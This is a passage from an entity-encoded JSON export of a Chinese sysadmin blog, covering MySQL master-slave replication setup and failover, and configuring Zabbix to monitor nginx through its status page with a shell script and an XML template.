#&#x521B;&#x5EFA;&#x7528;&#x6237;mysql&gt; create user &apos;mast_repl&apos;@&apos;192.168.1.101(&#x4ECE;&#x673A;ip)&apos; identified by &apos;123456&apos;; #&#x914D;&#x7F6E;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x6743;&#x9650;mysql&gt; grant replication slave on *.* to &apos;mast_repl&apos;@&apos;192.168.1.101(&#x4ECE;&#x673A;ip)&apos; identified by &apos;123456&apos;; 4&#x3001;&#x82E5;orders&#x4E2D;&#x5DF2;&#x6709;&#x6570;&#x636E;&#xFF0C;&#x8FD8;&#x9700;&#x8981;&#x9501;&#x5B9A;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6570;&#x636E;&#x5BFC;&#x5165;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;12345678910111213#&#x9501;&#x5B9A;mysql&gt; flush tables with read lock;#&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x540E;&#xFF0C;&#x67E5;&#x770B;&#x4E3B;&#x6570;&#x636E;&#x5E93;master&#x72B6;&#x6001;&#x5E76;&#x89E3;&#x9501;&#xFF1A;mysql&gt; show master status; +------------------+----------+--------------+------------------+-------------------+ | File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set | +------------------+----------+--------------+------------------+-------------------+ | mysql-bin.000003 | 2005 | orders | mysql | | +------------------+----------+--------------+------------------+-------------------+ 1 row in set (0.00 sec) mysql&gt; unlock tables; &#x4ECE;&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;1&#x3001;&#x914D;&#x7F6E;&#x670D;&#x52A1;ID12345678910111213141516171819vim /etc/my.cnf [mysqld]#server_id&#x662F;&#x5FC5;&#x987B;&#x7684;&#xFF0C;&#x800C;&#x4E14;&#x552F;&#x4E00;server-id=2# &#x4F7F;&#x5F97;slave&#x53EA;&#x8BFB;.&#x53EA;&#x6709;&#x7528;&#x6237;&#x62E5;&#x6709;SUPER&#x6743;&#x9650;&#x548C;&#x5728;&#x4E0A;&#x9762;&#x7684;slave&#x7EBF;&#x7A0B;&#x80FD;&#x591F;&#x4FEE;&#x6539;&#x6570;&#x636E;.# &#x4F60;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x6B64;&#x9879;&#x53BB;&#x4FDD;&#x8BC1;&#x6CA1;&#x6709;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x4F1A;&#x610F;&#x5916;&#x7684;&#x4FEE;&#x6539;slave&#x800C;&#x4E0D;&#x662F;master&#x4E0A;&#x7684;&#x6570;&#x636E;#read_only# &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),# &#x9700;&#x8981;&#x6253;&#x5F00;slave&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;#log_bin=mysql-bin# &#x5982;&#x679C;&#x4F60;&#x5728;&#x4F7F;&#x7528;&#x94FE;&#x5F0F;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7ED3;&#x6784;&#x7684;&#x590D;&#x5236;&#x6A21;&#x5F0F; (A-&gt;B-&gt;C),# &#x4F60;&#x9700;&#x8981;&#x5728;&#x670D;&#x52A1;&#x5668;B&#x4E0A;&#x6253;&#x5F00;&#x6B64;&#x9879;.# &#x6B64;&#x9009;&#x9879;&#x6253;&#x5F00;&#x5728;&#x4ECE;&#x7EBF;&#x7A0B;&#x4E0A;&#x91CD;&#x505A;&#x8FC7;&#x7684;&#x66F4;&#x65B0;&#x7684;&#x65E5;&#x5FD7;, &#x5E76;&#x5C06;&#x5176;&#x5199;&#x5165;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;.# &#x5982;&#x679C;&#x6253;&#x5F00;log_bin&#xFF0C;&#x5374;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;log_slave_updates&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x9519;&#x8BEF;&#x7684;&#x914D;&#x7F6E;&#x3002;#log_slave_updates 2&#x3001;&#x91CD;&#x542F;MySQL&#x670D;&#x52A1;1service mysqld restart 3&#x3001;&#x914D;&#x7F6E;&#x590D;&#x5236;123456789101112#&#x767B;&#x5F55;mysql -uroot -pEnter password: #&#x6267;&#x884C;mysql&gt; change master to master_host=&apos;192.168.1.100&apos;, master_user=&apos;mast_repl&apos;, master_password=&apos;123456&apos;, master_port=3306, master_log_file=&apos;mysql-bin.000003&apos;, master_log_pos=2005, master_connect_retry=10; &#x53C2;&#x6570;&#x8BE6;&#x89E3;&#xFF1A;master_host:&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;IP&#x3002;master_user&#xFF1A;&#x914D;&#x7F6E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x65F6;&#x5EFA;&#x7ACB;&#x7684;&#x7528;&#x6237;&#x540D;master_password&#xFF1A;&#x7528;&#x6237;&#x5BC6;&#x7801;master_port&#xFF1A;&#x4E3B;&#x670D;&#x52A1;&#x5668;mysql&#x7AEF;&#x53E3;&#xFF0C;&#x5982;&#x679C;&#x672A;&#x66FE;&#x4FEE;&#x6539;&#xFF0C;&#x9ED8;&#x8BA4;&#x5373;&#x53EF;&#x3002;master_log_file&#xFF1A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x540D;&#x79F0;&#xFF0C;&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;Filemaster_log_pos&#xFF1A;&#x65E5;&#x5FD7;&#x4F4D;&#x7F6E;&#xFF0C;&#x586B;&#x5199;&#x67E5;&#x770B;master&#x72B6;&#x6001;&#x65F6;&#x663E;&#x793A;&#x7684;Positionmaster_connect_retry&#xFF1A;&#x91CD;&#x8FDE;&#x6B21;&#x6570; 4&#x3001;&#x542F;&#x52A8;&#x8FDB;&#x7A0B;1mysql&gt; start slave; 5&#x3001;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x72B6;&#x6001;123456789101112131415mysql&gt; show slave status\\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.1.100 Master_User: mast_repl Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000003 Read_Master_Log_Pos: 2369 Relay_Log_File: jhq0113-relay-bin.000002 Relay_Log_Pos: 647 Relay_Master_Log_File: mysql-bin.000003 Slave_IO_Running: Yes Slave_SQL_Running: Yes ... &#x82E5;Slave_IO_Running&#x548C;Slave_SQL_Running&#x5747;&#x4E3A;Yes&#xFF0C;&#x5219;&#x8868;&#x793A;&#x914D;&#x7F6E;&#x6210;&#x529F;&#x3002; &#x5E38;&#x89C1;&#x914D;&#x7F6E;&#x9519;&#x8BEF;Q&#xFF1A;&#x62A5;&#x9519;&#x5982;&#x4E0B;123 Slave_IO_Running: ConnectingSlave_SQL_Running: Yes Last_IO_Error: error connecting to master &apos;mast_repl@192.168.1.100:3306&apos; - retry-time: 10 retries: 66 A&#xFF1A;&#x53EF;&#x80FD;&#x539F;&#x56E0;&#x5982;&#x4E0B;1&#x3001;mast_repl&#x7528;&#x6237;&#x6CA1;&#x6709;&#x590D;&#x5236;&#x6743;&#x9650;&#xFF0C;&#x5728;&#x4E3B;&#x5E93;&#x901A;&#x8FC7;&#x3010;show grants for &#x2018;mast_repl&#x2019;@&#x2019;192.168.1.100&#x2019;&#x3011;&#x547D;&#x4EE4;&#x67E5;&#x8BE2;&#x3002;2&#x3001;change master to&#x547D;&#x4EE4;&#x4E2D;&#x7684;master_password&#x9519;&#x8BEF;&#xFF0C;&#x5373;mast_repl&#x7528;&#x6237;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&#x3002;3&#x3001;change master to&#x547D;&#x4EE4;&#x4E2D;&#x7684;master_log_pos&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x4E3B;&#x5E93;&#x901A;&#x8FC7;&#x3010;show master status&#x3011;&#x547D;&#x540D;&#x67E5;&#x8BE2;&#x3002; &#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x539F;&#x7406;MySQL&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x8FC7;&#x7A0B;&#x4E3B;&#x8981;&#x7531;&#x4E09;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x5B8C;&#x6210;&#x3002;&#x5176;&#x4E2D;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;(Sql&#x7EBF;&#x7A0B;&#x548C;IO&#x7EBF;&#x7A0B;)&#x5728;Slave&#x7AEF;&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;(IO&#x7EBF;&#x7A0B;)&#x5728;Master&#x7AEF;&#x3002; Slave &#x4E0A;&#x9762;&#x7684;IO&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x4E0A; Master&#xFF0C;&#x5E76;&#x8BF7;&#x6C42;&#x4ECE;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x7684;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;(&#x6216;&#x8005;&#x4ECE;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x65E5;&#x5FD7;)&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF1B; Master &#x63A5;&#x6536;&#x5230;&#x6765;&#x81EA; Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x7684;&#x8BF7;&#x6C42;&#x540E;&#xFF0C;&#x901A;&#x8FC7;&#x8D1F;&#x8D23;&#x590D;&#x5236;&#x7684; IO &#x7EBF;&#x7A0B;&#x6839;&#x636E;&#x8BF7;&#x6C42;&#x4FE1;&#x606F;&#x8BFB;&#x53D6;&#x6307;&#x5B9A;&#x65E5;&#x5FD7;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x4E4B;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x4FE1;&#x606F;&#xFF0C;&#x8FD4;&#x56DE;&#x7ED9; Slave &#x7AEF;&#x7684; IO &#x7EBF;&#x7A0B;&#x3002;&#x8FD4;&#x56DE;&#x4FE1;&#x606F;&#x4E2D;&#x9664;&#x4E86;&#x65E5;&#x5FD7;&#x6240;&#x5305;&#x542B;&#x7684;&#x4FE1;&#x606F;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x5305;&#x62EC;&#x672C;&#x6B21;&#x8FD4;&#x56DE;&#x7684;&#x4FE1;&#x606F;&#x5728; Master &#x7AEF;&#x7684; Binary Log &#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x4EE5;&#x53CA;&#x5728; Binary Log &#x4E2D;&#x7684;&#x4F4D;&#x7F6E;&#xFF1B; Slave &#x7684; IO &#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;&#x4FE1;&#x606F;&#x540E;&#xFF0C;&#x5C06;&#x63A5;&#x6536;&#x5230;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#x4F9D;&#x6B21;&#x5199;&#x5165;&#x5230; Slave &#x7AEF;&#x7684;Relay Log&#x6587;&#x4EF6;(mysql-relay-bin.xxxxxx)&#x7684;&#x6700;&#x672B;&#x7AEF;&#xFF0C;&#x5E76;&#x5C06;&#x8BFB;&#x53D6;&#x5230;&#x7684;Master&#x7AEF;&#x7684;bin-log&#x7684;&#x6587;&#x4EF6;&#x540D;&#x548C;&#x4F4D;&#x7F6E;&#x8BB0;&#x5F55;&#x5230;master- info&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x5728;&#x4E0B;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x7684;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x6E05;&#x695A;&#x7684;&#x9AD8;&#x901F;Master&#x201C;&#x6211;&#x9700;&#x8981;&#x4ECE;&#x67D0;&#x4E2A;bin-log&#x7684;&#x54EA;&#x4E2A;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x5F80;&#x540E;&#x7684;&#x65E5;&#x5FD7;&#x5185;&#x5BB9;&#xFF0C;&#x8BF7;&#x53D1;&#x7ED9;&#x6211;&#x201D; Slave &#x7684; SQL &#x7EBF;&#x7A0B;&#x68C0;&#x6D4B;&#x5230; Relay Log &#x4E2D;&#x65B0;&#x589E;&#x52A0;&#x4E86;&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x4F1A;&#x9A6C;&#x4E0A;&#x89E3;&#x6790;&#x8BE5; Log &#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x6210;&#x4E3A;&#x5728; Master &#x7AEF;&#x771F;&#x5B9E;&#x6267;&#x884C;&#x65F6;&#x5019;&#x7684;&#x90A3;&#x4E9B;&#x53EF;&#x6267;&#x884C;&#x7684; Query &#x8BED;&#x53E5;&#xFF0C;&#x5E76;&#x5728;&#x81EA;&#x8EAB;&#x6267;&#x884C;&#x8FD9;&#x4E9B; Query&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5728; Master &#x7AEF;&#x548C; Slave &#x7AEF;&#x6267;&#x884C;&#x4E86;&#x540C;&#x6837;&#x7684; Query&#xFF0C;&#x6240;&#x4EE5;&#x4E24;&#x7AEF;&#x7684;&#x6570;&#x636E;&#x662F;&#x5B8C;&#x5168;&#x4E00;&#x6837;&#x7684;&#x3002; &#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x4E3B;&#x53D8;&#x4ECE;&#xFF0C;&#x4ECE;&#x53D8;&#x4E3B;&#x4E3B;&#x670D;&#x52A1;&#x5668;: 192.168.1.101&#x4ECE;&#x670D;&#x52A1;&#x5668;: 192.168.1.100 1234567891011121314151617181920212223242526272829303132333435# &#x51C6;&#x5907;&#x5DE5;&#x4F5C;1&#x3001;&#x786E;&#x8BA4;&#x4ECE;&#x5E93;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x540C;&#x6B65;&#x5B8C;&#x6210;&#x3002;&#x5728;&#x539F;&#x6709;&#x7684;&#x4ECE;&#x673A;101&#x4E0A;&#xFF0C;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x3010;show slave status\\G;&#x3011;&#x67E5;&#x770B;&#x3010;Slave_SQL_Running_State&#x3011;&#x7684;&#x72B6;&#x6001;&#x662F;&#x5426;&#x4E3A;&#x3010;Slave has read all relay log; waiting for more updates&#x3011;&#x3002;2&#x3001;&#x6253;&#x5F00;&#x4ECE;&#x5E93;&#x7684;binlog&#x76F8;&#x5173;&#x914D;&#x7F6E;&#xFF0C;&#x6CE8;&#x91CA;&#x6389;&#x4E3B;&#x5E93;&#x7684;binlog&#x914D;&#x7F6E;&#x3002;3&#x3001;&#x5728;&#x4ECE;&#x5E93;&#x521B;&#x5EFA;&#x8D26;&#x53F7;&#x5E76;&#x8D4B;&#x4E88;&#x590D;&#x5236;&#x7684;&#x6743;&#x9650;create user &apos;mastj&apos;@&apos;192.168.1.100(&#x65B0;&#x7684;&#x4ECE;&#x673A;ip)&apos; identified by &apos;123456&apos;;grant replication slave on *.* to &apos;mastj&apos;@&apos;192.168.1.100(&#x65B0;&#x7684;&#x4ECE;&#x673A;ip)&apos; identified by &apos;123456&apos;;FLUSH PRIVILEGES;# &#x4ECE;&#x53D8;&#x4E3B;(&#x4EE5;&#x4E0B;&#x4E3A;101&#x4E0A;&#x7684;&#x64CD;&#x4F5C;)4&#x3001;&#x505C;&#x6B62;&#x4ECE;&#x5E93;&#x7684;&#x590D;&#x5236;&#x3002;stop slave&#x3002;5&#x3001;&#x6362;&#x4ECE;&#x5E93;&#x4E3A;&#x4E3B;&#x5E93;RESET MASTER6&#x3001;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x67E5;&#x770B;&#x4E3B;&#x72B6;&#x6001;&#xFF0C;&#x8BB0;&#x5F55;File&#x548C;Position&#x503C;&#x3002;service mysql restartshow master status;+-------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------+----------+--------------+------------------+-------------------+| master-bin.000001 | 154 | &#x7565; | mysql | |+-------------------+----------+--------------+------------------+-------------------+# &#x4E3B;&#x53D8;&#x4ECE;(&#x4EE5;&#x4E0B;&#x4E3A;100&#x4E0A;&#x7684;&#x64CD;&#x4F5C;)7&#x3001;RESET SLAVE;8&#x3001;change master to master_host=&apos;192.168.1.101&apos;, master_user=&apos;mast_repl&apos;, master_password=&apos;123456&apos;, master_port=3306, master_log_file=&apos;mysql-bin.000001&apos;, master_log_pos=154, master_connect_retry=10;9&#x3001;&#x91CD;&#x542F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E76;&#x68C0;&#x67E5;Slave_IO_Running&#x548C;Slave_SQL_Running&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x90FD;&#x4E3A;yes&#xFF0C;&#x8868;&#x540D;&#x4E3B;&#x4ECE;&#x5207;&#x6362;&#x6210;&#x529F;service mysql restartshow slave status; &#x94FE;&#x63A5;&#x76F8;&#x5173;mysql&#x4E2D;&#x6587;&#x624B;&#x518C;http://doc.mysql.cn/mysql5/refman-5.1-zh.html-chapter/ my.cnf&#x53C2;&#x6570;&#x8BE6;&#x89E3;https://my.oschina.net/eduosi/blog/270535 &#x7EBF;&#x4E0A;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x62A5;&#x9519;&#x6545;&#x969C;&#x5904;&#x7406;&#x603B;&#x7ED3;http://xstarcd.github.io/wiki/MySQL/online_mysqlrepl_error.html Mysql&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x7684;&#x590D;&#x5236;&#x539F;&#x7406;http://blog.csdn.net/hguisu/article/details/7325124 &#x4E0D;&#x540C;&#x573A;&#x666F;&#x4E0B; MySQL &#x7684;&#x8FC1;&#x79FB;&#x65B9;&#x6848;https://dbarobin.com/2015/09/15/migration-of-mysql-on-different-scenes","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"}]},{"title":"zabbix监控nginx","slug":"zabbix监控nginx","date":"2016-10-06T10:24:17.000Z","updated":"2016-11-18T01:17:04.158Z","comments":true,"path":"2016/10/06/zabbix监控nginx/","link":"","permalink":"http://www.wangxin123.com/2016/10/06/zabbix监控nginx/","excerpt":"zabbix&#x76D1;&#x63A7;nginx&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x914D;&#x7F6E;ngx_status &#x542F;&#x7528;nginx status&#x914D;&#x7F6E;&#x5728;&#x9ED8;&#x8BA4;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x52A0;&#x4E0A;location&#x6216;&#x8005;&#x4F60;&#x5E0C;&#x671B;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x7684;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x3002;1234567891011server { listen *:80 default_server; server_name _; location /nginx-status { stub_status on; access_log off; #allow 127.0.0.1; #deny all; }}","keywords":null,"text":"zabbix&#x76D1;&#x63A7;nginx&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x914D;&#x7F6E;ngx_status &#x542F;&#x7528;nginx status&#x914D;&#x7F6E;&#x5728;&#x9ED8;&#x8BA4;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x52A0;&#x4E0A;location&#x6216;&#x8005;&#x4F60;&#x5E0C;&#x671B;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x7684;&#x4E3B;&#x673A;&#x91CC;&#x9762;&#x3002;1234567891011server { listen *:80 default_server; server_name _; location /nginx-status { stub_status on; access_log off; #allow 127.0.0.1; #deny all; }} &#x91CD;&#x542F;nginx1service nginx restart &#x6253;&#x5F00;status&#x9875;&#x9762;123456# &#x5982;&#x679C;nginx&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E0D;&#x662F;80 curl http://ip:port/nginx-status# curl http://127.0.0.1/nginx-statusActive connections: 11921 server accepts handled requests 11989 11989 11991 Reading: 0 Writing: 7 Waiting: 42 nginx status&#x8BE6;&#x89E3;active connections &#x2013; &#x6D3B;&#x8DC3;&#x7684;&#x8FDE;&#x63A5;&#x6570;&#x91CF;server accepts handled requests &#x2014; &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11989&#x4E2A;&#x8FDE;&#x63A5; , &#x6210;&#x529F;&#x521B;&#x5EFA;11989&#x6B21;&#x63E1;&#x624B;, &#x603B;&#x5171;&#x5904;&#x7406;&#x4E86;11991&#x4E2A;&#x8BF7;&#x6C42;reading &#x2014; &#x8BFB;&#x53D6;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8FDE;&#x63A5;&#x6570;.writing &#x2014; &#x54CD;&#x5E94;&#x6570;&#x636E;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x6570;&#x91CF;waiting &#x2014; &#x5F00;&#x542F; keep-alive &#x7684;&#x60C5;&#x51B5;&#x4E0B;,&#x8FD9;&#x4E2A;&#x503C;&#x7B49;&#x4E8E; active &#x2013; (reading+writing), &#x610F;&#x601D;&#x5C31;&#x662F; Nginx &#x5DF2;&#x7ECF;&#x5904;&#x7406;&#x5B8C;&#x6B63;&#x5728;&#x7B49;&#x5019;&#x4E0B;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x6307;&#x4EE4;&#x7684;&#x9A7B;&#x7559;&#x8FDE;&#x63A5;. zabbix&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;&#x5B89;&#x88C5;zabbix agent&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x5E76;&#x4FEE;&#x6539;zabbix_agentd.conf&#x6587;&#x4EF6;1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 &#x6765;&#x81F3;zabbix&#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDC;&#x7A0B;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x5141;&#x8BB8;&#x88AB;&#x6267;&#x884C;Server=zabbix_server_IP zabbix&#x670D;&#x52A1;&#x5668;ip&#x5730;&#x5740;ServerActive=zabbix_server_IP &#x4E3B;&#x52A8;&#x5411;zabbix server&#x53D1;&#x9001;&#x76D1;&#x63A7;&#x5185;&#x5BB9;Hostname=name name&#x914D;&#x7F6E;&#x7684;&#x5185;&#x5BB9;&#x8981;&#x548C;zabbix&#x670D;&#x52A1;&#x5668;&#x914D;&#x7F6E;&#x7684;Host name&#x4E00;&#x81F4;UnsafeUserParameters=1 &#x662F;&#x5426;&#x542F;&#x7528;&#x81EA;&#x5B9A;&#x4E49;key,zabbix&#x76D1;&#x63A7;mysql&#x3001;tomcat&#x7B49;&#x6570;&#x636E;&#x65F6;&#x9700;&#x8981;&#x81EA;&#x5B9A;&#x4E49;key &#x7F16;&#x5199;&#x5BA2;&#x6237;&#x7AEF;&#x811A;&#x672C;ngx_status.sh, &#x5B58;&#x653E;/etc/zabbix/scripts&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x6267;&#x884C;&#x6743;&#x9650;&#x3002;1234567891011121314151617181920212223242526272829303132HOST=&quot;127.0.0.1&quot;PORT=&quot;80&quot; # &#x68C0;&#x6D4B;nginx&#x8FDB;&#x7A0B;&#x662F;&#x5426;&#x5B58;&#x5728;function ping { /sbin/pidof nginx | wc -l }# &#x68C0;&#x6D4B;nginx&#x6027;&#x80FD;function active { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| grep &apos;Active&apos; | awk &apos;{print $NF}&apos;}function reading { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| grep &apos;Reading&apos; | awk &apos;{print $2}&apos;}function writing { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| grep &apos;Writing&apos; | awk &apos;{print $4}&apos;}function waiting { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| grep &apos;Waiting&apos; | awk &apos;{print $6}&apos;}function accepts { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| awk NR==3 | awk &apos;{print $1}&apos;}function handled { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| awk NR==3 | awk &apos;{print $2}&apos;}function requests { /usr/bin/curl &quot;http://$HOST:$PORT/nginx-status/&quot; 2&gt;/dev/null| awk NR==3 | awk &apos;{print $3}&apos;}# &#x6267;&#x884C;function$1 &#x5C06;&#x81EA;&#x5B9A;&#x4E49;&#x7684;UserParameter&#x52A0;&#x5165;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x542F;agentd.1234# vim /etc/zabbix/zabbix_agentd.d/userparameter_mysql.confUserParameter=nginx.status[*],/etc/zabbix/scripts/ngx_status.sh $1#service zabbix-agent restart &#x670D;&#x52A1;&#x5668;zabbix_get&#x6570;&#x636E;&#x68C0;&#x6D4B;&#x6B64;&#x6B65;&#x9AA4;&#x53EF;&#x4EE5;&#x8DF3;&#x8FC7;&#xFF0C;&#x4F46;&#x6700;&#x597D;&#x8FD8;&#x662F;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#xFF0C;&#x901A;&#x8FC7;&#x6B64;&#x547D;&#x4EE4;&#x68C0;&#x6D4B;&#x5BA2;&#x6237;&#x7AEF;&#x914D;&#x7F6E;&#x662F;&#x5426;&#x6B63;&#x786E;1234# /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[accepts]&apos;9570756# /usr/bin/zabbix_get -s agentd&#x673A;&#x5668;ip -k &apos;nginx.status[ping]&apos;1 zabbix web&#x7AEF;&#x914D;&#x7F6E;&#x5BFC;&#x5165;Template App NGINX&#x6A21;&#x677F;&#x6A21;&#x677F;&#x5DF2;&#x7ECF;&#x5199;&#x597D;&#xFF0C;&#x4F4D;&#x4E8E;&#x6587;&#x7AE0;&#x672B;&#x5C3E;&#x3002; Link NGINX&#x6A21;&#x677F;&#x5230;&#x4E86;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x767B;&#x9646;zabbix&#x7BA1;&#x7406;&#x7AEF;&#xFF0C;link&#x6A21;&#x677F;&#x5230;nginx&#x670D;&#x52A1;&#x5668;&#xFF1A;configuration-&gt;hosts-&gt;&#x70B9;&#x51FB;nginx&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;-&gt;&#x70B9;&#x51FB;template-&gt;Link new templates&#x8F93;&#x5165;&#x201D;Template App NGINX&#x201D;-&gt;Add-&gt;&#x6700;&#x540E;&#x70B9;&#x51FB;update&#x3002; Template App NGINX&#x6A21;&#x677F;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;zabbix_export&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;date&gt;2016-10-6T01:29:50Z&lt;/date&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;templates&gt; &lt;template&gt; &lt;template&gt;Template App NGINX&lt;/template&gt; &lt;name&gt;Template App NGINX&lt;/name&gt; &lt;description&gt;&lt;/description&gt; &lt;groups&gt; &lt;group&gt; &lt;name&gt;Templates&lt;/name&gt; &lt;/group&gt; &lt;/groups&gt; &lt;applications&gt; &lt;application&gt; &lt;name&gt;nginx&lt;/name&gt; &lt;/application&gt; &lt;/applications&gt; &lt;items&gt; &lt;item&gt; &lt;name&gt;nginx status connections active&lt;/name&gt; &lt;type&gt;0&lt;/type&gt; &lt;snmp_community/&gt; &lt;multiplier&gt;0&lt;/multiplier&gt; &lt;snmp_oid/&gt; &lt;key&gt;nginx.status[active]&lt;/key&gt; &lt;delay&gt;60&lt;/delay&gt; &lt;history&gt;90&lt;/history&gt; &lt;trends&gt;365&lt;/trends&gt; &lt;status&gt;0&lt;/status&gt; &lt;value_type&gt;3&lt;/value_type&gt; &lt;allowed_hosts/&gt; &lt;units/&gt; 